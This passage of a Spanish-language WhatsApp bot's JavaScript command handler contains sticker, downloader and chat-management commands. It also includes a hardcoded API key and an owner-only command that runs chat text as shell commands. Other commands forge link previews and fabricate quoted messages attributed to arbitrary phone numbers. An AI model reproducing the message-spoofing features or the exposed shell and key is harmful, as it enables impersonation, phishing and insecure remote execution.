.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decre
ase,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(`./sticker/${sender}.webp`)
} else {
reply(`Envie o etiquete una imagen/vido/gif con el comando: ${prefix}swm nombre|autor *OJO!* El video/gif no debe de durar mas de 10 segundos`)
}
break
case 'sinfondo':
if ((isMedia || isQuotedImage)) {
const encmedianb = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo : sam
const median = await samu330.downloadAndSaveMediaMessage(encmedianb)
reply(mess.wait)
keyrmbg = 'bcAvZyjYAjKkp1cmK8ZgQvWH'
ranp = getRandom('.png')
await removeBackgroundFromImageFile({path: median, apiKey: keyrmbg, size: 'auto', type: 'auto', ranp}).then(res => {
fs.unlinkSync(median)
let buffer = Buffer.from(res.base64img, 'base64')
samu330.sendMessage(from, buffer, image, {quoted: fimg, caption: '©Samu330 | NoBg™'})
fs.unlinkSync(buffer)
})
}
break
case 'snobg':
if ((isMedia || isQuotedImage)) {
const encmedianb1 = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo : sam
const median1 = await samu330.downloadAndSaveMediaMessage(encmedianb1)
reply(mess.wait)
keyrmbg = 'bcAvZyjYAjKkp1cmK8ZgQvWH'
ranp = getRandom('.png')
await removeBackgroundFromImageFile({path: median1, apiKey: keyrmbg, size: 'auto', type: 'auto', ranp}).then(res => {
fs.unlinkSync(median1)
let buffer = Buffer.from(res.base64img, 'base64')
samu330.sendMessage(from, buffer, sticker, {quoted: ftoko, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
fs.unlinkSync(buffer)                                                            
})                                                                               
}
break
case 'getbio':
var yy = sam.message.extendedTextMessage.contextInfo.mentionedJid[0]
var p = await samu330.getStatus(`${yy}`, MessageType.text)
reply(p.status)
if (p.status == 401) {
reply("[ERROR 401] Status Profile Not Found")
}
break
case 'getpic':
if (sam.message.extendedTextMessage != undefined){
mentioned = sam.message.extendedTextMessage.contextInfo.mentionedJid
try {
pic = await samu330.getProfilePicture(mentioned[0])
} catch {
pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
thumb = await getBuffer(pic)
samu330.sendMessage(from, thumb, MessageType.image, {caption: '𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆🍒'})
}
break
case 'fdeface':
var nn = budy.slice(9)
var urlnye = nn.split("|")[0];
var titlenye = nn.split("|")[1];
var descnye = nn.split("|")[2];
run = getRandom('.jpeg')
var media1 = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo : sam
var media2 = await samu330.downloadAndSaveMediaMessage(media1)
var ddatae = await imageToBase64(JSON.stringify(media2).replace(/\"/gi, ''))
samu330.sendMessage(from, {
text: `${urlnye}`,
matchedText: `${urlnye}`,
canonicalUrl: `${urlnye}`,
description: `${descnye}`,
title: `${titlenye}`,
jpegThumbnail: ddatae }, 'extendedTextMessage', { detectLinks: false })
break

            case 'setstatus':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
if (!arg) return reply('Escribe algo almenos')
wa.setBio(arg)
.then((res) => wa.sendFakeStatus2(from, JSON.stringify(res), fake))
.catch((err) => wa.sendFakeStatus2(from, JSON.stringify(err), fake))
break
case 'setname':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
if (!arg) return reply('Escribe algo almenos')
wa.setName(arg)
.then((res) => wa.sendFakeStatus2(from, JSON.stringify(res), fake))
.catch((err) => wa.sendFakeStatus2(from, JSON.stringify(err), fake))
break
case 'setreply':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
if (!arg) return reply(`Uso: ${prefix}setreply texto`)
fake = arg
wa.sendFakeStatus2(from, `𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆🍒`, fake)
break
case 'term':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
if (!arg) return
exec(arg, (err, stdout) => {
if (err) return wa.sendFakeStatus2(from, err, fake)
if (stdout) wa.sendFakeStatus2(from, stdout, fake)
})
break
case 'contacto':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
argz = arg.split('|')
if (!argz) return reply(`Uso ${prefix}contacto @tag o escribe el numero|nombre`)
if (sam.message.extendedTextMessage != undefined){
mentioned = sam.message.extendedTextMessage.contextInfo.mentionedJid
wa.sendKontak(from, mentioned[0].split('@')[0], argz[1])
} else {
wa.sendKontak(from, argz[0], argz[1])
}
break

case 'runtime':
run = process.uptime()
let text = msg.runtime(run)
samu330.sendMessage(from, '*Tiempo encendido*', MessageType.text, { quoted: { key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
"productMessage": {
"product": {
"title": `${text}`,
"description": "",
"currencyCode": "SYP",
"priceAmount1000": "999999999999999999",
"retailerId": "𝒩𝓎𝒶𝓃ℬ𝑜𝓉🍃",
"productImageCount": 10
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}}                                                                                                                                                                                                                                                                        })
break
case 'desfijar':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
samu330.modifyChat(from, ChatModification.unpin)
reply('*succes unpin this chat*')
console.log('unpin chat = ' + from)
break
case 'fijar':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
samu330.modifyChat(from, ChatModification.pin)
reply('*Este chat se ah fijado*')
console.log('Se fijo el chat = ' + from)
break
case 'sinleer':
const unread = await samu330.loadAllUnreadMessages()
samu330.sendMessage(from, `Total de mensajes sin leer: ${unread.length}`, MessageType.text)

break
case 'desarchivar':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
reply('*Todos los chats archivados fueron desarchivados*')
console.log('succes unarchive chat = ' + from)
anu = await samu330.chats.all()
for (let _ of anu) {
samu330.modifyChat(_.jid, ChatModification.unarchive)
}
break
case 'archivar':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
reply('*Vale, espera..*')
console.log('succes archive chat = ' + from)
await sleep(3000)
samu330.modifyChat(from, ChatModification.archive)
reply('*Yap*')
break
case 'vaciartodo':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
reply('*Todos los chats han sido vaciados*')
smyprry = await samu330.chats.all()
for (let _ of smyprry) {
await sleep(4000)
samu330.modifyChat(_.jid, ChatModification.delete)
}
break
case 'vaciar':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
reply('*Este chat a sido vaciado*')
console.log('succes delete chat = ' + from)
await sleep(4000)
samu330.modifyChat(from, ChatModification.delete)
break
case 'silencio':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
samu330.modifyChat(from, ChatModification.mute, 24*60*60*1000)
reply('*Este chat a sido silenciado*')
console.log('succes mute chat = ' + from)
break
case 'desilenciar':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
samu330.modifyChat(from, ChatModification.unmute)
reply('*Este chat a dejado de silenciarse*')
console.log('succes unmute chat = ' + from)
break
case 'loli':
if (!isRegister) return reply(mess.only.usrReg)

samu330.updatePresence(from, Presence.composing)
uk = ["anime loli"]
nk = uk[Math.floor(Math.random() * uk.length)]
try {
data = await getJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
method: 'get'
})
reply(mess.wait)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
samu330.sendMessage(from, pok, image, {
quoted: fimg, caption: `*Samu300*🐉`, contextInfo: {"forwardingScore": 9999, "isForwarded": true}
})

} catch {
reply(mess.ferr)
}
break

case 'neko':
if (!isRegister) return reply(mess.only.usrReg)

samu330.updatePresence(from, Presence.composing)
uk = ["anime neko"]
nk = uk[Math.floor(Math.random() * uk.length)]
try {
data = await getJson(`https://api.fdci.se/sosmed/rep.php?gambar=${nk}`, {
  method: 'get'
})
reply(mess.wait)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
samu330.sendMessage(from, pok, image, {
  quoted: fimg, caption: `*Samu330*🐉`, contextInfo: {"forwardingScore": 9999, "isForwarded": true}
})

} catch {
  reply(mess.ferr)
}
break
case 'ig':
case 'instagram':
if (args.length < 1) return reply('Y el link? ')
if(!isUrl(args[0]) && !args[0].includes('instagram')) return reply(mess.error.Iv)
teks = args.join(' ')
if (!teks.endsWith('-video') && !teks.endsWith('-foto')) return reply('Escriba  -foto o -video dependiendo del archivo que quiera descargar')
reply(mess.wait)
if (teks.endsWith('-foto')) {
igl = teks.replace('-foto',"") 
res = await fotoIg(igl).catch(e => {
  reply(mess.ferr)
})
sendFileFromUrl(res[0].foto, image, {quoted: sam})
}
if (teks.endsWith('-video')) {
igl = teks.replace('-video',"")
res = await videoIg(teks).catch(e => {
  reply(mess.ferr)
})
sendFileFromUrl(res[0].video, video, {mimetype: 'video/mp4', quoted: sam})
}
break
case 'facebook':
case 'fb':
if (args.length < 1) return reply('Y el link? ')
if(!isUrl(args[0]) && !args[0].includes('facebook')) return reply('LINK DE FACEBOOK MLDT STUPID!!')
teks = args.join(' ')
reply(mess.wait)
res = await fbDown(teks).catch(e => {
  reply(mess.ferr)
})
a = res[0]
result = `
Titulo :* ${a.judul}
*Source :* ${a.source}
*Tamaño :* ${a.size}
*Calidad :* ${a.quality}
*Tipo :* ${a.type}
*Name File :* ${a.judul}.${a.type}
`
sendFileFromUrl(a.thumb, image, {caption: result, quoted: sam})
sendFileFromUrl(a.link, video, { mimetype: 'video/mp4',quoted: sam, filename: `${a.judul}.${a.type}`})
break
            case 'ytsearch':

if (args.length == 0) return reply(`Ejemplo: ${prefix + command} Me olvide de vivir`)
query = args.join(' ')
try {
get_result = await getJson(`https://api.lolhuman.xyz/api/ytsearch?apikey=${api}&query=${query}`)
get_result = get_result.result
ini_txt = ""
for (var x of get_result) {
ini_txt += `*◦Titulo* : ${x.title}\n`
ini_txt += `*◦Vistas* : ${x.views}\n`
ini_txt += `◦Publicado el ${x.published}\n`
ini_txt += `📸Thumbnail : ${x.thumbnail}\n`
ini_txt += `📲Link : https://www.youtube.com/watch?v=${x.videoId}\n\n`
}
reply(ini_txt)
} catch {
reply(`Servidor *1* con problemas, realizando tu busqueda de *${q}* en el servidor *2*`)
res = await yts(q)
searchyt = ``
for (let i of res.all) {
searchyt += `
*Titulo :* ${i.title}
*ID Video :* ${i.videoId}
*Vistas :* ${i.views}
*Subido :* ${i.ago}
*Duracion :* ${i.timestamp}
*Channel :* ${i.author.name}
*Link Channel :* ${i.author.url}
*Link Video :* ${i.url}
`
}
var samusamuxd = searchyt.trim()
sendFileFromUrl(res.all[0].image, image, {quoted: fimg, caption: samusamuxd, sendEphemeral: true})
}
break
case 'tts':
case 'voz':
if (args.length < 1) return samu330.sendMessage(from, 'Y el codigo de idioma? escribe el comando *idiomas* para ver la lista', text, { quoted: ftoko })
const gtts = require('./lib/gtts')(args[0])
if (args.length < 2) return samu330.sendMessage(from, 'Escribe el texto', text, {quoted: floc})
dtt = body.slice(8)
ranm = getRandom('.mp3')
rano = getRandom('.ogg')
dtt.length > 300
? reply('Mira, si no sabes usar esto... mejor no lo agas 😤')
: gtts.save(ranm, dtt, function() {
samu330.updatePresence(from, Presence.recording)
samu330.sendMessage(from, fs.readFileSync(ranm), audio, {quoted: fliveLoc, mimetype: 'audio/mp4', duration: -999999999999999999, ptt:true, sendEphemeral: true, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
fs.unlinkSync(ranm)
})

break
case 'estadopic':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
var textodestatusxd = args.join(' ')
reply('*Espera un momento...*')
var foto = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
var inisiap = await samu330.downloadAndSaveMediaMessage(foto)
var inisiap2 = fs.readFileSync(inisiap)
samu330.sendMessage('status@broadcast', inisiap2, MessageType.image, {quoted: ftoko, caption: `${textodestatusxd}`})
reply('*SE ENVIO LA IMAGEN COMO ESTADO*')
break
case 'estadovid':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
reply('*Espera un momento...*')
var foto = isQuotedVideo ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
var inisiap = await samu330.downloadAndSaveMediaMessage(foto)
var inisiap2 = fs.readFileSync(inisiap)
samu330.sendMessage('status@broadcast', inisiap2, MessageType.video, {quoted: ftoko, caption: `${body.slice(12)}`})
reply('Se envio el video al estado!')
break
case 'estado':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
var estadotxt = args.join(' ')
samu330.sendMessage('status@broadcast', estadotxt, MessageType.text)
reply('*SE ENVIO EL ESTADO*')
break
case 'marcarsinleer':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
var chats = await samu330.chats.all()
chats.map( async ({ jid }) => {
await samu330.chatRead(jid, 'unread')
})
var teks = `\`\`\`Se an marcado como NO LEIDOS ${chats.length} chats !\`\`\``
await samu330.sendMessage(from, teks, MessageType.text, {quoted: fdoc})
console.log(chats.length)
break
case 'leertodo':
if (!itsMe) return reply('Este comando solo puede ser usado por *Samu330* ⚙')
var chats = await samu330.chats.all()
chats.map( async ({ jid }) => {
await samu330.chatRead(jid)
})
var teks = `\`\`\`Se an leido ${chats.length} chats !\`\`\``
await samu330.sendMessage(from, teks, MessageType.text, {quoted: floc})
console.log(chats.length)
break
case 'reply':
if (!args) return reply(`Uso :\n${prefix}reply [52xxx|frase|frase]]\n\nEx : \n${prefix}reply 0|hola wasa|que pex`)
var ghh = args.join(' ')
var nomorr = ghh.split("|")[0];
var target = ghh.split("|")[1];
var bot = ghh.split("|")[2];
samu330.sendMessage(from, `${bot}`, MessageType.text, {quoted: { key: { fromMe: false, participant: nomorr+'@s.whatsapp.net', ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
break
case 'fordward':
samu330.sendMessage(from, `${budy.slice(10)}`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true }})
break

            case 'todos':
samu330.updatePresence(from, Presence.composing)
if (!isGroup) return reply(mess.only.group)
if (!isRegister) return reply(mess.only.usrReg)
if (!isAdmin) return reply(mess.only.admin)
members_id = []
teks = (args.length > 1) ? body.slice(8).trim(): ''
teks += `  Total : ${groupMembers.length}\n`
for (let mem of groupMembers) {
teks += `┃ @${mem.jid.split('@')[0]}\n`
members_id.push(mem.jid)
}
mentions('[  *TAGALL* ]\n┏━━━━━━━━━━━━━━━━━━━━\n┠ ►'+teks+'┃━━━━━━━━━━━━━━━━━━━━\n┃────🪀 *Samu330* 🪀────\n┗━━━━━━━━━━━━━━━━━━━━', members_id, true)

break
case 'notificar':

if (!isAdmin) return reply(mess.only.admin)
samu330.updatePresence(from, Presence.composing)
if (!isRegister) return reply(mess.only.usrReg)
if (!isGroup) return reply(mess.only.group)
teks = `Notificación dada por @${sender.split("@")[0]}\n*Mensaje : ${args.join(' ')}*`
const groupN = await samu330.groupMetadata(from);
member = groupN['participants']
jids = [];
member.map(async adm => {
jids.push(adm.id.replace('c.us', 's.whatsapp.net'));
})
options = {
text: teks,
contextInfo: {
mentionedJid: jids, "forwardingScore": 9999, "isForwarded": true
},
quoted: faud
}
await samu330.sendMessage(from, options, MessageType.text)
break
case 'leermas':
samu330.updatePresence(from, Presence.composing)
if (!isRegister) return reply(mess.only.usrReg)

if (args.length < 1) return reply(`Escribe el texto\nEjemplo : ${prefix}readmore te amo/rdido un perro?`)
tels = body.slice(9)
var teksa = tels.split("/")[0];
var teks2 = tels.split("/")[1];
hasil = `${teksa}͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏